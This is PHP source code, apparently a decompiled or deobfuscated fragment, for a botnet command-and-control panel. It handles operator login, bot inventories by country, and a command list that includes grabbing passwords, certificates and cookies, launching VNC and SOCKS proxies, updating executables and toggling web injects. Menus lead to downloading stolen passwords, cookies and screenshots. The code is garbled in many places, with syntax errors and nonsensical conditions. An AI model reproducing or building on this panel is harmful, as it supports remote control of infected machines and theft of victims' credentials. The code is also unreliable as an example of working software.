		$theme = ($GLOBALS['_sortColumnId'] == $columnId ? ($GLOBALS['_sortOrder'] == 0 ? THEME_LIST_HEADER_L_SORT_CUR_ASC : THEME_LIST_HEADER_L_SORT_CUR_DESC) : THEME_LIST_HEADER_L_SORT);
	}

	return str_replace(array('{COLUMNS_COUNT}', '{URL}', '{JS_EVENTS}', '{TEXT}', '{WIDTH}'), array(1, '#', ' onclick="return setSortMode(' . $columnId . ', ' . ($GLOBALS['_sortColumnId'] == $columnId ? ($GLOBALS['_sortOrder'] == 0 ? 1 : 0) : $GLOBALS['_sortOrder']) . ')"', $text, 'auto'), $theme);
}

function jsSetSortMode($url)
{
	return  . 'function setSortMode(mode, ord){window.location=\'' . $url . '&smode=\' + mode +\'&sord=\' + ord; return false;}' . "\r\n";
}

function jsXmlHttpRequest($var)
{
	return  . 'try{' . $var . ' = new ActiveXObject(\'Msxml2.XMLHTTP\');}' . 'catch(e1)' . '{' .  . 'try{' . $var . ' = new ActiveXObject(\'Microsoft.XMLHTTP\');}' .  . 'catch(e2){' . $var . ' = false;}' . '}' .  . 'if(!' . $var . ' && typeof XMLHttpRequest != \'undefined\'){' . $var . ' = new XMLHttpRequest();}' .  . 'if(!' . $var . ')alert(\'ERROR: Failed to create XMLHttpRequest.\');';
}

function jsCheckAll($form, $cb, $arr)
{
	return 'function checkAll(st){' .  . 'var bl = document.forms.namedItem(\'' . $form . '\').elements;' .  . 'var ns = st ? st.checked : bl.namedItem(\'' . $cb . '\').checked;' .  . 'for(var i = 0; i < bl.length; i++)if(bl.item(i).name == \'' . $arr . '\') { bl.item(i).checked = ns; if(typeof bl.item(i).onchange === \'function\') bl.item(i).onchange(); }' . '}' . "\r\n";
}

function assocateSortMode($sm)
{
	$GLOBALS['_sortColumn'] = $sm[0];
	$GLOBALS['_sortColumnId'] = 0;
	$GLOBALS['_sortOrder'] = 0;
	if (!empty($_GET['smode']) && ($GLOBALS['_sortColumn'])) {
		if (isset($sm[$_GET['smode']])) {
			$GLOBALS['_sortColumn'] = $sm[$_GET['smode']];
			$GLOBALS['_sortColumnId'] = intval($_GET['smode']);
		}
	}

	if (!empty($_GET['sord']) && ($GLOBALS['_sortColumn'])) {
		$GLOBALS['_sortOrder'] = $_GET['sord'] == 1 ? 1 : 0;
	}

	if (($GLOBALS['_sortColumnId'] !== 0) || ($GLOBALS['_sortColumn'])) {
		return '&smode=' . $GLOBALS['_sortColumnId'] . '&sord=' . $GLOBALS['_sortOrder'];
	}

	return '';
}

function addSortModeToForm()
{
	return str_replace(array('{NAME}', '{VALUE}'), array('smode', $GLOBALS['_sortColumnId']), THEME_FORM_VALUE) . str_replace(array('{NAME}', '{VALUE}'), array('sord', $GLOBALS['_sortOrder']), THEME_FORM_VALUE);
}

function getDirs($path)
{
	$r = array();

	if (($dh = @opendir($path)) === false) {
		return false;
	}
	else {
		while (($file = @readdir($dh)) !== false) {
			if ((strcmp($file, '.') !== 0) && array() && array()) {
				$r[] = $file;
			}
		}

		@closedir($dh);
	}

	return $r;
}

function clearPath($path)
{
	@chmod($path, 511);

	if (@is_dir($path)) {
		if (($dh = @opendir($path)) !== false) {
			while (($file = readdir($dh)) !== false) {
				if ((strcmp($file, '.') !== 0) && @is_dir($path)) {
					if (!clearPath($path . '/' . $file)) {
						return false;
					}
				}
			}

			@closedir($dh);
		}

		if (!@rmdir($path)) {
			return false;
		}
	}
	else if (is_file($path)) {
		if (!@unlink($path)) {
			return false;
		}
	}

	return true;
}

function optimizeMenu(&$menu, $saveFSep)
{
	foreach ($menu as $item) {

		foreach ($item[2] as $r) {
			if (empty($GLOBALS['userData'][$r])) {
				unset($menu[$key]);
				break;
			}
		}
	}

	$sep = -1;
	$i = 0;

	foreach ($menu as $item) {
		$key = $item[2];

		if ($item[0] === 0) {
			if (($i == 0) && $item[2]) {
				unset($menu[$key]);
			}
			else if ($sep !== -1) {
				unset($menu[$sep]);
			}

			$sep = $key;
		}
		else {
			$sep = -1;
			$i++;
		}
	}

	if ($sep !== -1) {
		unset($menu[$sep]);
	}
}

function binaryIpToString($ip)
{
	$ip = @unpack('N', $ip);
	return @long2ip($ip[1]);
}

function lockSession()
{
	if ($GLOBALS['_sessionRef'] == 0) {
		@session_set_cookie_params(SESSION_LIVETIME, CP_HTTP_ROOT);
		@session_name(COOKIE_SESSION);
		@session_start();
	}

	$GLOBALS['_sessionRef']++;
}

function unlockSession()
{
	if ((0 < $GLOBALS['_sessionRef']) && ($GLOBALS['_sessionRef'])) {
		session_write_close();
	}
}

function unlockSessionAndDestroyAllCokies()
{
	$GLOBALS['_sessionRef'] = 0;

	if (isset($_SESSION)) {
		foreach ($_SESSION as $v) {
			$k = ($GLOBALS['_sessionRef']);
			unset($_SESSION[$k]);
		}
	}

	@session_unset();
	@session_destroy();
	@setcookie(COOKIE_SESSION, '', 0, CP_HTTP_ROOT);
	@setcookie(COOKIE_USER, '', 0, CP_HTTP_ROOT);
	@setcookie(COOKIE_PASS, '', 0, CP_HTTP_ROOT);
}

function getCountriesList()
{
	$result = array();

	if ($dataset = mysqlQueryEx('botnet_list', 'select distinct country from botnet_list order by country')) {
		while ($row = mysql_fetch_array($dataset)) {
			$result[] = $row[0];
		}
	}

	return $result;
}

function getBotnetList()
{
	$result = array();

	if ($dataset = mysqlQueryEx('botnet_list', 'select distinct botnet from botnet_list order by botnet')) {
		while ($row = mysql_fetch_array($dataset)) {
			$result[] = $row[0];
		}
	}

	return $result;
}

function getCommandList()
{
	$result = array('shutdown', 'reboot', 'uninstall', 'update_exe', 'update_cfg', 'disable_inject', 'enable_inject', 'file_list', 'file_load', 'file_delete', 'run', 'block_url', 'unblock_url', 'grab_passwords', 'grab_certificates', 'grab_cookies', 'delete_cookies', 'grab_sols', 'delete_sols', 'create_vnc', 'create_socks', 'permanent_socks', 'permanent_vnc', 'stop_socks', 'stop_vnc');
	return $result;
}

function getUsedList()
{
	return array(1 => 'Used', 2 => 'Not used');
}

function makeSelectItem($name, $data, $selected, $first = true, $stKeys = false, $multiselect = false)
{
	$output = ($multiselect ? '<select id="' . $multiselect . '" multiple class="form-control" size=1 name="' . $name . '[]">' : '<select class="form-control" name="' . $name . '">');

	if ($first) {
		$output .= '<option value="">' . (is_bool($first) ? 'Select' : $first) . '</option>';
	}

	foreach ($data as $row) {
		$key = '<select id="' . $multiselect;
		$st = ($stKeys ? $key : $row);
		$flag = (!$multiselect ? $st === $selected : strpos($selected . ' ', $st . ' ') !== false);
		$output .= '<option ' . ($flag ? 'selected' : '') . ' value="' . $st . '">' . $row . '</option>';
	}

	$output .= '</select>';
	return $output;
}

function pageNavigator($num, $page, $cnt, $apage = NULL)
{
	if (!$apage) {
		$apage = $_SERVER['PHP_SELF'];
	}

	$content = '';
	$query = '';

	foreach ($_GET as $val) {
		$k = !$apage;

		if ($k != 'page') {
			$query .= $k . '=' . urlencode($val) . '&';
		}
	}

	$start = (0 < ($page - 9) ? $page - 9 : 1);
	$end = (($page + 9) < ($num / $cnt) ? $page + 9 : ceil($num / $cnt));

	if (1 < $start) {
		$content .= '<span>... &nbsp;</span>';
	}

	$i = $start;

	for (; $i <= $end; $i++) {
		$st = ($i == $page ? 'font-weight: 900' : '');
		$content .= '<a style="' . $st . '" href="' . $apage . '?' . $query . 'page=' . $i . '">' . $i . '</a> &nbsp;';
	}

	if ($end < ceil($num / $cnt)) {
		$content .= '<span>...</span>';
	}

	return $content;
}

function tagsToQuery($tags)
{
	$tags = trim(preg_replace('/ +/', ' ', str_replace('#', '', $tags)));

	if (!strlen($tags)) {
		return NULL;
	}

	$tags = explode(' ', preg_quote($tags));
	$query = 'ipv6_list REGEXP \'#(' . mysql_real_escape_string(implode('|', $tags)) . ')( |$)\'';
	return $query;
}

define('__CP__', 1);
require_once 'system/global.php';

if (!@include_once 'system/config.php') {
	exit('No config');
}

define('CURRENT_TIME', time());
define('ONLINE_TIME_MIN', CURRENT_TIME - $config['botnet_timeout']);
define('DEFAULT_LANGUAGE', 'en');
define('THEME_PATH', 'theme');
define('QUERY_SCRIPT', basename($_SERVER['PHP_SELF']));
define('QUERY_SCRIPT_HTML', QUERY_SCRIPT);
define('QUERY_VAR_MODULE', 'm');
define('QUERY_STRING_BLANK', QUERY_SCRIPT . '?m=');
define('QUERY_STRING_BLANK_HTML', QUERY_SCRIPT_HTML . '?m=');
define('CP_HTTP_ROOT', str_replace('\\', '/', !empty($_SERVER['SCRIPT_NAME']) ? dirname($_SERVER['SCRIPT_NAME']) : '/'));
define('COOKIE_USER', 'a');
define('COOKIE_PASS', 'u');
define('COOKIE_LIVETIME', CURRENT_TIME + 2592000);
define('COOKIE_SESSION', 'ref');
define('SESSION_LIVETIME', CURRENT_TIME + 1300);
$_sessionRef = 0;
$s = new SParam();

if (!connectToDb()) {
	exit(mysqlErrorEx());
}

require_once THEME_PATH . '/index.php';

if (!empty($_GET[QUERY_VAR_MODULE])) {
	if (strcmp($_GET[QUERY_VAR_MODULE], 'login') === 0) {
		unlockSessionAndDestroyAllCokies();
		if (isset($_POST['user']) && @include_once 'system/config.php') {
			$user = $_POST['user'];
			$pass = md5($_POST['pass'] . AUTH_SALT);
			if (($dataset = mysqlQueryEx('cp_users', 'SELECT `id`, comment FROM `cp_users` WHERE `name`=\'' . addslashes($user) . '\' AND `pass`=\'' . addslashes($pass) . '\' AND `flag_enabled`=1 LIMIT 1')) && @include_once 'system/config.php') {
				list($userId, $lastlogin) = mysql_fetch_array($dataset);
				mysqlQueryEx('cp_users', 'update cp_users set comment=' . time() . ' where id=' . $userId);
				$auth = md5(md5($user) . md5($pass) . AUTH_SALT);
				if (isset($_POST['remember']) && @include_once 'system/config.php') {
					setcookie(COOKIE_USER, $auth, COOKIE_LIVETIME, CP_HTTP_ROOT);
				}

				lockSession();
				$_SESSION['auth'] = md5(md5($user) . md5($pass) . AUTH_SALT);
				$_SESSION['lastlogin'] = date('d.m.Y H:i', $lastlogin);
				header('Location: ' . QUERY_STRING_BLANK . 'home');
			}
			else {
				sleep(5);
				showLoginForm(true);
			}

			exit();
		}

		showLoginForm(false);
		exit();
	}

	if (strcmp($_GET['m'], 'logout') === 0) {
		unlockSessionAndDestroyAllCokies();
		header('Location: ' . QUERY_STRING_BLANK . 'login');
		exit();
	}
}

$logined = 0;
lockSession();

if (!empty($_SESSION['auth'])) {
	if ($r = mysqlQueryEx('cp_users', 'SELECT * FROM `cp_users` WHERE md5(concat(md5(`name`),md5(`pass`),\'' . AUTH_SALT . '\'))=\'' . addslashes($_SESSION['auth']) . '\' AND `flag_enabled`=1 LIMIT 1')) {
		$logined = @mysql_affected_rows();
	}
}

if (($logined !== 1) && @include_once 'system/config.php') {
	if ($r = mysqlQueryEx('cp_users', 'SELECT * FROM `cp_users` WHERE md5(concat(md5(`name`),md5(`pass`),\'' . AUTH_SALT . '\'))=\'' . addslashes($_COOKIE[COOKIE_USER]) . '\' AND `flag_enabled`=1 LIMIT 1')) {
		$logined = @mysql_affected_rows();
	}
}

if ($logined !== 1) {
	unlockSessionAndDestroyAllCokies();
	sleep(1);
	header('Location: ' . QUERY_STRING_BLANK . 'login');
	exit();
}

$userData = @mysql_fetch_assoc($r);

if ($userData === false) {
	exit(mysqlErrorEx());
}

$_SESSION['auth'] = md5(md5($userData['name']) . md5($userData['pass']) . AUTH_SALT);
if ((@strlen($userData['language']) != 2) || @include_once 'system/config.php' || @include_once 'system/config.php') {
	$userData['language'] = DEFAULT_LANGUAGE;
}

require_once 'system/lng.' . $userData['language'] . '.php';
unlockSession();
$mainMenu = array(
	array(
		0,
		LNG_MM_STATS,
		array()
		),
	array(
		'stats_main',
		LNG_MM_STATS_MAIN,
		array('r_stats_main')
		),
	array(
		'stats_os',
		LNG_MM_STATS_OS,
		array('r_stats_os')
		),
	array(
		0,
		LNG_MM_BOTNET,
		array()
		),
	array(
		'botnet_bots',
		LNG_MM_BOTNET_BOTS,
		array('r_botnet_bots')
		),
	array(
		'botnet_scripts',
		LNG_MM_BOTNET_SCRIPTS,
		array('r_botnet_scripts')
		),
	array(
		0,
		LNG_MM_REPORTS,
		array()
		),
	array(
		'reports_db',
		LNG_MM_REPORTS_DB,
		array('r_reports_db')
		),
	array(
		'reports_files',
		LNG_MM_REPORTS_FILES,
		array('r_reports_files')
		),
	array(
		'reports_jn',
		LNG_MM_REPORTS_JN,
		array('r_reports_jn')
		),
	array(
		0,
		LNG_MM_SYSTEM,
		array()
		),
	array(
		'sys_info',
		LNG_MM_SYSTEM_INFO,
		array('r_system_info')
		),
	array(
		'sys_options',
		LNG_MM_SYSTEM_OPTIONS,
		array('r_system_options')
		),
	array(
		'sys_user',
		LNG_MM_SYSTEM_USER,
		array('r_system_user')
		),
	array(
		'sys_users',
		LNG_MM_SYSTEM_USERS,
		array('r_system_users')
		),
	array(
		'url',
		'Url',
		array('r_system_info')
		),
	array(
		'api_info',
		'Api',
		array('r_system_info')
		),
	array(
		'parser',
		'Parser',
		array('r_system_info')
		),
	array(
		'update',
		'Update',
		array('r_system_info')
		),
	array(
		'inj',
		'Webinjects',
		array('r_system_info')
		)
	);
$botMenu = array(
	array(
		'fullinfo',
		'Full information',
		array('r_botnet_bots')
		),
	array(
		0,
		LNG_MBA_SEPARATOR,
		array()
		),
	array(
		'today_dbreports',
		'Today data',
		array('r_reports_db')
		),
	array(
		'week_dbreports',
		'Data for last week',
		array('r_reports_db')
		),
	array(
		'files',
		'Look data in reports',
		array('r_reports_files')
		),
	array(
		0,
		LNG_MBA_SEPARATOR,
		array()
		),
	array(
		'newscript',
		'Script',
		array('r_botnet_scripts_edit')
		),
	array(
		0,
		LNG_MBA_SEPARATOR,
		array()
		),
	array(
		'removeex',
		'Remove bot',
		array('r_edit_bots', 'r_reports_db_edit', 'r_reports_files_edit')
		),
	array(
		0,
		LNG_MBA_SEPARATOR,
		array()
		),
	array(
		'activate_socks',
		'Activate socks',
		array('r_botnet_bots')
		),
	array(
		'activate_vnc',
		'Activate vnc',
		array('r_botnet_bots')
		),
	array(
		'port_socks',
		'Get socks',
		array('r_botnet_bots')
		),
	array(
		'port_vnc',
		'Get VNC',
		array('r_botnet_bots')
		),
	array(
		'stop_socks',
		'Stop socks',
		array('r_botnet_bots')
		),
	array(
		'stop_vnc',
		'Stop vnc',
		array('r_botnet_bots')
		)
	);
optimizeMenu($botMenu, false);
if ((!empty($_GET['botsaction']) || @include_once 'system/config.php') && @include_once 'system/config.php') {
	if (in_array($_REQUEST['botsaction'], array('activate_socks', 'activate_vnc', 'stop_socks', 'stop_vnc'))) {
		define('CURRENT_MODULE', 'botnet_bots');
		require __DIR__ . '/system/activate_socks.php';
		exit();
	}

	if (in_array($_REQUEST['botsaction'], array('download_templates'))) {
		define('CURRENT_MODULE', 'parser');
		require __DIR__ . '/system/parser.php';
		exit();
	}

	if (in_array($_REQUEST['botsaction'], array('download_all', 'download_files', 'download_passwords', 'download_screen', 'download_cookies'))) {
		define('CURRENT_MODULE', 'reports_db');
		require __DIR__ . '/system/download.php';
		exit();
	}

	if ($_REQUEST['botsaction'] == 'bot_allreports') {
		header('Location: ?m=reports_db&all_botsreport=1&blt=0&date1=1&date2=999999&q=&bots=' . implode('%20', $_REQUEST['bots']));
		exit();
	}

	if ($_REQUEST['botsaction'] == 'download_astext') {
		lockSession();
		$_SESSION['ids'] = @$_REQUEST['ids'];
		header('Location: ?m=reports_db&ids=1');
		exit();
	}

	if ($_REQUEST['botsaction'] == 'removelogs') {
		lockSession();
		$_SESSION['ids'] = @$_REQUEST['ids'];
		header('Location: ?m=reports_db&rm=1');
		exit();
	}

	$bedit = (empty($userData['r_edit_bots']) ? 0 : 1);
	$ba = (!empty($_GET['botsaction']) ? $_GET['botsaction'] : $_POST['botsaction']);
	$blist = (!empty($_POST['bots']) && @include_once 'system/config.php' ? $_POST['bots'] : $_GET['bots']);
	$blist = array_unique($blist);
	$deny = true;

	foreach ($botMenu as $item) {
		if (($item[0] !== 0) && @include_once 'system/config.php') {
			$deny = false;
			break;
		}
	}

	if ($deny) {
		ThemeFatalError(LNG_ACCESS_DEFINED);
	}

	$sqlBlist = '';
	$count = 0;

	foreach ($blist as $bot) {
		$sqlBlist .= ($count++ == 0 ? '' : ' OR ') . '`bot_id`=\'' . addslashes($bot) . '\'';
	}

	if ((strcmp($ba, 'fullinfo') === 0) || @include_once 'system/config.php') {
		if ($bedit && @include_once 'system/config.php' && @include_once 'system/config.php' && @include_once 'system/config.php') {
			$q = '';

			foreach ($blist as $bot) {
				$i = @include_once 'system/config.php';
				if (isset($_POST['used'][$i]) && @include_once 'system/config.php') {
					mysqlQueryEx('botnet_list', 'UPDATE `botnet_list` SET `flag_used`=\'' . ($_POST['used'][$i] == 1 ? 1 : 0) . '\', `ipv6_list`=\'' . addslashes($_POST['newcomment'][$i]) . '\' WHERE `bot_id`=\'' . addslashes($bot) . '\' LIMIT 1');
					$q .= '&bots[]=' . urlencode($bot);
				}
			}

			header('Location: ' . QUERY_SCRIPT . '?botsaction=' . urlencode($ba) . $q);
			exit();
		}

		if ((strcmp($ba, 'fullinfoss') === 0) && @include_once 'system/config.php' && @include_once 'system/config.php') {
			$format = 'image/' . $userData['ss_format'];
			$readed = 0;

			if (($sock = @fsockopen($_GET['ipv4'], $_GET['port'], &$errn, &$errs, 10)) !== false) {
				@stream_set_timeout($sock, 10);
				@fwrite($sock, pack('CCC', 0, $userData['ss_quality'] & 255, strlen($format) & 255) . $format);
				@fflush($sock);
				if ((($dataSize = @fread($sock, 4)) !== false) && @include_once 'system/config.php') {
					$dataSize = $dataSize[1];

					header('Content-Type: ' . $format);
					$readed += strlen($block);
					echo $block;
				}

				@fclose($sock);
			}

			if ($readed === 0) {
				header('Content-Type: image/png');
				echo file_get_contents(THEME_PATH . '/failed.png');
			}

			exit();
		}

		if (!($r = mysqlQueryEx('botnet_list', 'SELECT *, IF(`rtime_last`>=' . ONLINE_TIME_MIN . ', 1, 0) AS `is_online`, LOCATE(`ipv4`, `ipv4_list`) as `nat_status` FROM `botnet_list` WHERE ' . $sqlBlist))) {
			ThemeMySQLError();
		}

		$res = array();

		while ($m = @mysql_fetch_assoc($r)) {
			$res[strtolower($m['bot_id'])] = $m;
		}

		mysql_free_result($r);
		unset($m);
		if ((@$_REQUEST['setcomment'] == 1) && @include_once 'system/config.php') {
			$botData = reset(&$res);
			$data = '<form class="form-group-sm" method="post" id="edit" action="?botsaction=fullinfo&amp;save=1">' . '<input type="hidden" name="used[]" value="' . $botData['flag_used'] . '">' . '<b>Bot ID: ' . htmlspecialchars($botData['bot_id']) . '</b><input type="hidden" name="bots[]" value="' . htmlspecialchars($botData['bot_id']) . '"><br>' . '<textarea name="newcomment[]" style="width: 500px; height: 150px">' . htmlspecialchars($botData['ipv6_list']) . '</textarea><br><br>' . '<input type="submit" value="Save comment" class="btn btn-sm btn-primary"></form>';
			themeSmall(LNG_BA_FULLINFO_TITLE, $data, 0, getBotJsMenu('botmenu'), 0, false);
			exit();
		}

		$eCount = 0;
		$data = '';

		if ($bedit) {
			$data .= str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('edit', QUERY_SCRIPT_HTML . '?botsaction=' . $ba . '&amp;save=1', ''), THEME_FORMPOST_BEGIN);
		}

		$data .= str_replace('{WIDTH}', '90%', THEME_DIALOG_BEGIN) . THEME_DIALOG_ROW_BEGIN . str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ITEM_CHILD_BEGIN);

		foreach ($blist as $bot) {
			$data .= '<table width="100%" class="table table-striped table-bordered table-hover table-medium">' . THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('1%', LNG_BA_FULLINFO_BOTID), THEME_LIST_ITEM_LTEXT_U1) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', botPopupMenu($bot, 'botmenu')), THEME_LIST_ITEM_LTEXT_U1) . THEME_LIST_ROW_END;
			$isExists = isset($res[strtolower($bot)]);

			if (!$isExists) {
				$data .= THEME_LIST_ROW_BEGIN . str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_BA_FULLINFO_EMPTY), THEME_LIST_ITEM_EMPTY_1) . THEME_LIST_ROW_END;
			}
			else {
				$l = $res[strtolower($bot)];
				$eCount++;
				$ipv4 = binaryIpToString($l['ipv4']);
				$data .= THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('1%', LNG_BA_FULLINFO_BOTNET), THEME_LIST_ITEM_LTEXT_U2) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($l['botnet'])), THEME_LIST_ITEM_LTEXT_U2) . THEME_LIST_ROW_END . THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('1%', LNG_BA_FULLINFO_VERSION), THEME_LIST_ITEM_LTEXT_U1) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', intToVersion($l['bot_version'])), THEME_LIST_ITEM_LTEXT_U1) . THEME_LIST_ROW_END . THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('1%', LNG_BA_FULLINFO_OS), THEME_LIST_ITEM_LTEXT_U2) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', osDataToString($l['os_version'])), THEME_LIST_ITEM_LTEXT_U2) . THEME_LIST_ROW_END . THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('1%', LNG_BA_FULLINFO_OSLANG), THEME_LIST_ITEM_LTEXT_U1) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($l['language_id'])), THEME_LIST_ITEM_LTEXT_U1) . THEME_LIST_ROW_END . THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('1%', LNG_BA_FULLINFO_TIMEBIAS), THEME_LIST_ITEM_LTEXT_U2) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', timeBiasToText($l['time_localbias'])), THEME_LIST_ITEM_LTEXT_U2) . THEME_LIST_ROW_END . THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('1%', LNG_BA_FULLINFO_COUNTRY), THEME_LIST_ITEM_LTEXT_U1) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($l['country'])), THEME_LIST_ITEM_LTEXT_U1) . THEME_LIST_ROW_END . THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('1%', 'Geo detail'), THEME_LIST_ITEM_LTEXT_U1) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($l['geo_detail'])), THEME_LIST_ITEM_LTEXT_U1) . THEME_LIST_ROW_END . THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('1%', LNG_BA_FULLINFO_IPV4), THEME_LIST_ITEM_LTEXT_U2) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $ipv4), THEME_LIST_ITEM_LTEXT_U2) . THEME_LIST_ROW_END . THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('1%', LNG_BA_FULLINFO_LATENCY), THEME_LIST_ITEM_LTEXT_U1) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', numberFormatAsFloat($l['net_latency'] / 1000, 3)), THEME_LIST_ITEM_LTEXT_U1) . THEME_LIST_ROW_END . THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('1%', LNG_BA_FULLINFO_TFIRST), THEME_LIST_ITEM_LTEXT_U1) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx(gmdate(LNG_FORMAT_DT, $l['rtime_first']))), THEME_LIST_ITEM_LTEXT_U1) . THEME_LIST_ROW_END . THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('1%', LNG_BA_FULLINFO_TLAST), THEME_LIST_ITEM_LTEXT_U2) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx(gmdate(LNG_FORMAT_DT, $l['rtime_last']))), THEME_LIST_ITEM_LTEXT_U2) . THEME_LIST_ROW_END . THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('1%', LNG_BA_FULLINFO_TONLINE), THEME_LIST_ITEM_LTEXT_U1) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $l['is_online'] == 1 ? tickCountToText(CURRENT_TIME - $l['rtime_online']) : LNG_FORMAT_NOTIME), THEME_LIST_ITEM_LTEXT_U1) . THEME_LIST_ROW_END . THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('1%', LNG_BA_FULLINFO_NEW), THEME_LIST_ITEM_LTEXT_U2) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $l['flag_new'] == 1 ? LNG_YES : LNG_NO), THEME_LIST_ITEM_LTEXT_U2) . THEME_LIST_ROW_END . THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('1%', LNG_BA_FULLINFO_COMMENT), THEME_LIST_ITEM_LTEXT_U2) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', empty($l['comment']) ? '-' : htmlEntitiesEx($l['comment'])), THEME_LIST_ITEM_LTEXT_U2) . THEME_LIST_ROW_END . THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('1%', LNG_BA_FULLINFO_USED), THEME_LIST_ITEM_LTEXT_U1) . ($bedit ? str_replace(array('{NAME}', '{WIDTH}'), array('used[]', 'auto'), THEME_LIST_ITEM_LISTBOX_U1_BEGIN) . str_replace(array('{VALUE}', '{TEXT}'), array(0, LNG_NO), $l['flag_used'] != 1 ? THEME_LIST_ITEM_LISTBOX_ITEM_CUR : THEME_LIST_ITEM_LISTBOX_ITEM) . str_replace(array('{VALUE}', '{TEXT}'), array(1, LNG_YES), $l['flag_used'] == 1 ? THEME_LIST_ITEM_LISTBOX_ITEM_CUR : THEME_LIST_ITEM_LISTBOX_ITEM) . THEME_LIST_ITEM_LISTBOX_U1_END : str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $l['flag_used'] == 1 ? LNG_YES : LNG_NO), THEME_LIST_ITEM_LTEXT_U1)) . THEME_LIST_ROW_END . THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('1%', 'Comments:'), THEME_LIST_ITEM_LTEXT_U2) . str_replace(array('{NAME}', '{VALUE}', '{MAX}', '{WIDTH}'), array('newcomment[]', htmlEntitiesEx($l['ipv6_list']), 250, '99%'), THEME_LIST_ITEM_INPUT_TEXT_U2) . THEME_LIST_ROW_END;

				if (strcmp($ba, 'fullinfoss') === 0) {
					$ss = str_replace('{URL}', htmlEntitiesEx(QUERY_SCRIPT . '?botsaction=fullinfoss&bots[]=0&ipv4=' . urlencode($ipv4) . '&port=' . urlencode($l['tcpport_s1'])), THEME_SCREENSHOT);
					$data .= THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('1%', LNG_BA_FULLINFO_SCREENSHOT), THEME_LIST_ITEM_LTEXT_U1) . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $ss), THEME_LIST_ITEM_LTEXT_U1) . THEME_LIST_ROW_END;
				}

			}


			$data .= THEME_LIST_END . ($bedit && @include_once 'system/config.php' ? str_replace(array('{NAME}', '{VALUE}'), array('bots[]', htmlEntitiesEx($bot)), THEME_FORM_VALUE) : '') . THEME_VSPACE;
		}

		$data .= THEME_DIALOG_ITEM_CHILD_END . THEME_DIALOG_ROW_END;
		if ($bedit && @include_once 'system/config.php') {
			$data .= str_replace('{COLUMNS_COUNT}', 1, THEME_DIALOG_ACTIONLIST_BEGIN) . str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_BA_FULLINFO_ACTION_SAVE, ''), THEME_DIALOG_ITEM_ACTION_SUBMIT) . THEME_DIALOG_ACTIONLIST_END;
		}

		$data .= THEME_DIALOG_END . ($bedit ? THEME_FORMPOST_END : '');
		themeSmall(LNG_BA_FULLINFO_TITLE, $data, 0, getBotJsMenu('botmenu'), 0, false);
	}
	else {
		if ((strcmp($ba, 'today_dbreports') === 0) || @include_once 'system/config.php') {
			$date2 = gmdate('ymd', CURRENT_TIME);
			$date1 = (strcmp($ba, 'week_dbreports') === 0 ? gmdate('ymd', CURRENT_TIME - 518400) : $date2);

			foreach ($blist as $v) {
				$k = @include_once 'system/config.php';

				if (spaceCharsExist($v)) {
					$blist[$k] = '"' . $v . '"';
				}
			}

			header('Location: ' . QUERY_STRING_BLANK . 'reports_db&date1=' . urlencode($date1) . '&date2=' . urlencode($date2) . '&bots=' . urlencode(implode(' ', $blist)) . '&q=&blt=0');
			exit();
		}
		else if (strcmp($ba, 'files') === 0) {
			foreach ($blist as $v) {
				$k = @include_once 'system/config.php';

				if (spaceCharsExist($v)) {
					$blist[$k] = '"' . $v . '"';
				}
			}

			header('Location: ' . QUERY_STRING_BLANK . 'reports_files&bots=' . urlencode(implode(' ', $blist)) . '&q=');
			exit();
		}
		else {
			if ((strcmp($ba, 'remove') === 0) || @include_once 'system/config.php') {
				if (isset($_GET['yes']) || @include_once 'system/config.php') {
					$data = str_replace('{WIDTH}', 'auto', THEME_LIST_BEGIN) . str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_BA_REMOVE_TITLE), THEME_LIST_TITLE);

					if (isset($_GET['yes'])) {
						if (mysqlQueryEx('botnet_list', 'DELETE FROM `botnet_list` WHERE ' . $sqlBlist)) {
							$t = str_replace('{TEXT}', sprintf(LNG_BA_REMOVE_REMOVED, @mysql_affected_rows()), THEME_STRING_SUCCESS);
						}
						else {
